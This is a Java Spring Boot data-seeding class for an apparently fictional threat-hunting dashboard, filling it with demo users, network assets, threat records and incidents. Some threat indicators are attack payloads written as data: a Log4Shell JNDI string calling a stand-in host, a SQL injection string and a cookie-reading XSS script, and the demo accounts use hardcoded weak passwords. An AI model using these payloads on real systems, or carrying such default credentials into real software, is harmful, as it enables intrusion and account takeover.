package com.darkshield.config;

import com.darkshield.model.*;
import com.darkshield.model.enums.*;
import com.darkshield.repository.*;
import com.darkshield.service.ThreatScoringEngine;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.CommandLineRunner;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

@Component
public class DataSeeder implements CommandLineRunner {

    private static final Logger logger = LoggerFactory.getLogger(DataSeeder.class);

    @Autowired private UserRepository userRepository;
    @Autowired private ThreatRepository threatRepository;
    @Autowired private IncidentRepository incidentRepository;
    @Autowired private AssetRepository assetRepository;
    @Autowired private PasswordEncoder passwordEncoder;
    @Autowired private ThreatScoringEngine scoringEngine;

    @Override
    public void run(String... args) {
        if (userRepository.count() > 0) {
            logger.info("Database already seeded. Skipping.");
            return;
        }
        logger.info("🌱 Seeding DarkShield database...");
        seedUsers();
        List<Asset> assets = seedAssets();
        List<Threat> threats = seedThreats();
        seedIncidents(threats, assets);
        logger.info("✅ Database seeding complete!");
    }

    private void seedUsers() {
        userRepository.saveAll(List.of(
            User.builder().username("admin").email("admin@darkshield.io").password(passwordEncoder.encode("admin123")).fullName("System Administrator").role(Role.ROLE_ADMIN).enabled(true).createdAt(LocalDateTime.now()).build(),
            User.builder().username("hunter").email("hunter@darkshield.io").password(passwordEncoder.encode("hunter123")).fullName("Sarah Chen").role(Role.ROLE_HUNTER).enabled(true).createdAt(LocalDateTime.now()).build(),
            User.builder().username("analyst").email("analyst@darkshield.io").password(passwordEncoder.encode("analyst123")).fullName("James Rodriguez").role(Role.ROLE_ANALYST).enabled(true).createdAt(LocalDateTime.now()).build()
        ));
        logger.info("  → 3 users created (admin/hunter/analyst)");
    }

    private List<Asset> seedAssets() {
        List<Asset> assets = assetRepository.saveAll(List.of(
            Asset.builder().hostname("web-prod-01").ipAddress("10.0.1.10").type(AssetType.SERVER).operatingSystem("Ubuntu 22.04").status(AssetStatus.ONLINE).department("Engineering").openPorts(List.of("80","443","22")).vulnerabilities(List.of("CVE-2024-1234")).riskScore(25).lastScanAt(LocalDateTime.now()).build(),
            Asset.builder().hostname("db-prod-01").ipAddress("10.0.1.20").type(AssetType.DATABASE).operatingSystem("CentOS 8").status(AssetStatus.ONLINE).department("Engineering").openPorts(List.of("27017","22")).vulnerabilities(List.of()).riskScore(10).lastScanAt(LocalDateTime.now()).build(),
            Asset.builder().hostname("fw-edge-01").ipAddress("10.0.0.1").type(AssetType.FIREWALL).operatingSystem("PAN-OS 11").status(AssetStatus.ONLINE).department("Security").openPorts(List.of("443")).vulnerabilities(List.of()).riskScore(5).lastScanAt(LocalDateTime.now()).build(),
            Asset.builder().hostname("ws-dev-042").ipAddress("10.0.2.42").type(AssetType.WORKSTATION).operatingSystem("Windows 11").status(AssetStatus.COMPROMISED).department("Marketing").openPorts(List.of("135","445","3389")).vulnerabilities(List.of("CVE-2024-5678","CVE-2024-9012","CVE-2024-3456")).riskScore(85).lastScanAt(LocalDateTime.now()).build(),
            Asset.builder().hostname("router-core-01").ipAddress("10.0.0.2").type(AssetType.ROUTER).operatingSystem("Cisco IOS XE").status(AssetStatus.ONLINE).department("Infrastructure").openPorts(List.of("22","161")).vulnerabilities(List.of()).riskScore(8).lastScanAt(LocalDateTime.now()).build(),
            Asset.builder().hostname("iot-cam-lobby").ipAddress("10.0.3.100").type(AssetType.IOT_DEVICE).operatingSystem("Embedded Linux").status(AssetStatus.QUARANTINED).department("Facilities").openPorts(List.of("80","554","8080")).vulnerabilities(List.of("CVE-2024-7777","CVE-2024-8888")).riskScore(72).lastScanAt(LocalDateTime.now()).build(),
            Asset.builder().hostname("cloud-k8s-01").ipAddress("10.0.5.10").type(AssetType.CLOUD_INSTANCE).operatingSystem("Amazon Linux 2").status(AssetStatus.ONLINE).department("DevOps").openPorts(List.of("443","6443")).vulnerabilities(List.of()).riskScore(12).lastScanAt(LocalDateTime.now()).build()
        ));
        logger.info("  → {} assets created", assets.size());
        return assets;
    }

    private List<Threat> seedThreats() {
        List<Threat> threats = new ArrayList<>();
        threats.add(buildThreat("Emotet Trojan C2 Communication","Emotet banking trojan detected communicating with C2 server",ThreatType.MALWARE,ThreatSeverity.CRITICAL,"VirusTotal","185.234.72.10","10.0.2.42",52.52,13.405,28.6139,77.209,"Russia","T1566.001","d41d8cd98f00b204e9800998ecf8427e"));
        threats.add(buildThreat("Spear Phishing Campaign - CFO Targeting","Targeted phishing emails impersonating board members",ThreatType.PHISHING,ThreatSeverity.HIGH,"Internal Report","103.25.67.89","10.0.2.42",35.6762,139.6503,28.6139,77.209,"Japan","T1566.002","suspicious-cfo-invoice.pdf.exe"));
        threats.add(buildThreat("DDoS Attack on Web Infrastructure","Volumetric UDP flood targeting web servers",ThreatType.DDOS,ThreatSeverity.HIGH,"Cloudflare Alert","45.33.32.156","10.0.1.10",37.7749,-122.4194,28.6139,77.209,"USA","T1498.001",""));
        threats.add(buildThreat("APT29 Cozy Bear Activity","Nation-state actor lateral movement detected",ThreatType.APT,ThreatSeverity.CRITICAL,"CrowdStrike","91.234.99.42","10.0.1.20",55.7558,37.6173,28.6139,77.209,"Russia","T1078","apt29-beacon.dll,mimikatz.exe"));
        threats.add(buildThreat("LockBit 3.0 Ransomware","Ransomware payload detected on marketing workstation",ThreatType.RANSOMWARE,ThreatSeverity.CRITICAL,"Sentinel One","194.135.33.21","10.0.2.42",48.8566,2.3522,28.6139,77.209,"France","T1486","lockbit3_payload.exe"));
        threats.add(buildThreat("Log4Shell Exploitation Attempt","CVE-2021-44228 exploitation via JNDI lookup",ThreatType.ZERO_DAY,ThreatSeverity.CRITICAL,"WAF Logs","178.62.55.100","10.0.1.10",51.5074,-0.1278,28.6139,77.209,"UK","T1190","${jndi:ldap://evil.com/a}"));
        threats.add(buildThreat("Credential Stuffing Attack","Automated login attempts using leaked credentials",ThreatType.BRUTE_FORCE,ThreatSeverity.MEDIUM,"Auth Logs","77.88.55.66","10.0.1.10",55.7558,37.6173,28.6139,77.209,"Russia","T1110.004",""));
        threats.add(buildThreat("SQL Injection on User Portal","Blind SQL injection detected on login form",ThreatType.SQL_INJECTION,ThreatSeverity.HIGH,"ModSecurity","203.0.113.42","10.0.1.10",-33.8688,151.2093,28.6139,77.209,"Australia","T1190","' OR 1=1--"));
        threats.add(buildThreat("XSS in Customer Feedback Form","Stored XSS payload in feedback submission",ThreatType.XSS,ThreatSeverity.MEDIUM,"Bug Bounty","198.51.100.23","10.0.1.10",40.4168,-3.7038,28.6139,77.209,"Spain","T1059.007","<script>document.cookie</script>"));
        threats.add(buildThreat("Insider Data Exfiltration","Unusual data transfer to personal cloud storage",ThreatType.INSIDER_THREAT,ThreatSeverity.HIGH,"DLP Alert","10.0.2.42","external",28.6139,77.209,37.7749,-122.4194,"Internal","T1567",""));

        for (Threat t : threats) {
            t.setThreatScore(scoringEngine.calculateThreatScore(t));
        }
        List<Threat> saved = threatRepository.saveAll(threats);
        logger.info("  → {} threats created", saved.size());
        return saved;
    }

    private Threat buildThreat(String title, String desc, ThreatType type, ThreatSeverity sev, String source, String srcIp, String tgtIp, double srcLat, double srcLon, double tgtLat, double tgtLon, String country, String mitre, String iocs) {
        return Threat.builder()
            .title(title).description(desc).type(type).severity(sev).source(source)
            .sourceIp(srcIp).targetIp(tgtIp).sourceLatitude(srcLat).sourceLongitude(srcLon)
            .targetLatitude(tgtLat).targetLongitude(tgtLon).sourceCountry(country)
            .mitreAttackIds(List.of(mitre)).indicators(iocs.isEmpty() ? List.of() : Arrays.asList(iocs.split(",")))
            .status(ThreatStatus.NEW).reportedBy("admin").detectedAt(LocalDateTime.now().minusHours((long)(Math.random()*72)))
            .build();
    }

    private void seedIncidents(List<Threat> threats, List<Asset> assets) {
        List<Incident> incidents = List.of(
            Incident.builder().title("Active Ransomware Outbreak - Marketing Dept").description("LockBit 3.0 detected on marketing workstation").severity(IncidentSeverity.P1).status(IncidentStatus.CONTAINMENT).assignedTo("hunter").relatedThreats(List.of(threats.get(4).getId())).affectedAssets(List.of(assets.get(3).getId())).timeline(List.of(Incident.TimelineEntry.builder().action("INCIDENT_CREATED").performedBy("SYSTEM").details("Auto-escalated from threat score").timestamp(LocalDateTime.now().minusHours(2)).build())).createdAt(LocalDateTime.now().minusHours(2)).build(),
            Incident.builder().title("APT29 Lateral Movement Investigation").description("Nation-state actor activity on database server").severity(IncidentSeverity.P1).status(IncidentStatus.INVESTIGATING).assignedTo("hunter").relatedThreats(List.of(threats.get(3).getId())).affectedAssets(List.of(assets.get(1).getId())).timeline(List.of(Incident.TimelineEntry.builder().action("INCIDENT_CREATED").performedBy("admin").details("Created from APT29 detection").timestamp(LocalDateTime.now().minusHours(5)).build())).createdAt(LocalDateTime.now().minusHours(5)).build(),
            Incident.builder().title("DDoS Mitigation - Web Servers").description("Ongoing volumetric DDoS on production web infrastructure").severity(IncidentSeverity.P2).status(IncidentStatus.RECOVERY).assignedTo("analyst").relatedThreats(List.of(threats.get(2).getId())).affectedAssets(List.of(assets.get(0).getId())).timeline(List.of(Incident.TimelineEntry.builder().action("INCIDENT_CREATED").performedBy("analyst").details("DDoS attack confirmed").timestamp(LocalDateTime.now().minusHours(8)).build())).createdAt(LocalDateTime.now().minusHours(8)).build(),
            Incident.builder().title("Compromised IoT Camera - Lobby").description("IoT camera quarantined after botnet C2 traffic detected").severity(IncidentSeverity.P3).status(IncidentStatus.CLOSED).assignedTo("analyst").relatedThreats(List.of()).affectedAssets(List.of(assets.get(5).getId())).timeline(List.of(Incident.TimelineEntry.builder().action("INCIDENT_RESOLVED").performedBy("hunter").details("Device quarantined and firmware reset").timestamp(LocalDateTime.now().minusHours(1)).build())).createdAt(LocalDateTime.now().minusDays(1)).resolvedAt(LocalDateTime.now().minusHours(1)).resolutionNotes("Firmware reset and network isolated").build()
        );
        incidentRepository.saveAll(incidents);
        logger.info("  → {} incidents created", incidents.size());
    }
}
